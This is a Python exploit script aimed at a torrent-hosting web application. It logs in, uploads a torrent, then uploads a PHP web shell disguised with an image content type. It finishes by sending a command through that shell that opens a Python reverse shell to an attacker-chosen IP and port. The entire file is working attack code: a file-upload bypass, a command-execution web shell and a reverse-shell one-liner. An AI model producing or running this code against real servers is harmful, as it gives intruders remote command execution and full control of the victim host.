#/usr/bin/python3

import requests
import sys
import re
import time

i = open("shell2.php", "w")
i.write("<?php if(isset($_REQUEST['cmd'])){ echo \"<pre>\"; $cmd = ($_REQUEST['cmd']); system($cmd); echo \"</pre>\"; die; }?>")
i.close()

imagefile = {'file': ('shell2.php', open("shell2.php", "rb"), "image/jpg")}




if sys.argv[1] == "-h" or len(sys.argv) != 7:
	print("Usage: python3 {} <url (e.g. http://10.10.10.6> <username> <password> </path/.torrent file> <revShell_IP> <revShell_port>".format(sys.argv[0]))


elif len(sys.argv) == 7:
	url = sys.argv[1]
	username = sys.argv[2]
	password = sys.argv[3]
	filepath = sys.argv[4]
	revIP = sys.argv[5]
	revPort = sys.argv[6]
	torrentfile = {'torrent': open(filepath, "rb")}


	s = requests.session()
	print("\nLogging in with {}:{} ..." .format(username, password))
	reg = s.post(url+"/torrent/login.php", data={"username":username, "password":password})

	if "\nInvalid login, please try again" in reg.text:
		print("\nInvalid Login, please check your credentials")

	else:
		print ("\nLogged in\n\nUploading torrent...")
		upload = s.post(url+"/torrent/torrents.php?mode=upload", data= {"filename":"test456", "type":"3", "subtype":"19", "user_id":"", "anonymous2":"false", "anonymous":"true", "autoset":"enabled", "info":"test", "registration":"false", "hideuser":"false", "submit":"Upload Torrent"}, files=torrentfile)
		print(upload.text)
		
		print("\ntorrent uploaded.. retrieving file ID")
		fileid = re.search("details&id=(.*?)'", upload.text)
		print("FILEID =========== " + fileid.group(1))

		time.sleep(5)
		print("\nuploading image")
		s.post(url +"/torrent/upload_file.php?mode=upload&id={}".format(fileid.group(1)), files=imagefile, data={"submit":"Submit Screenshot"})

		print("\nInitiating reverse shell to {}:{}".format(revIP,revPort))
		s.get("{}/torrent/upload/{}.php?cmd=export RHOST=\"{}\";export RPORT={};python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")'".format(url,fileid.group(1), revIP,revPort))

		print("Check your shell")



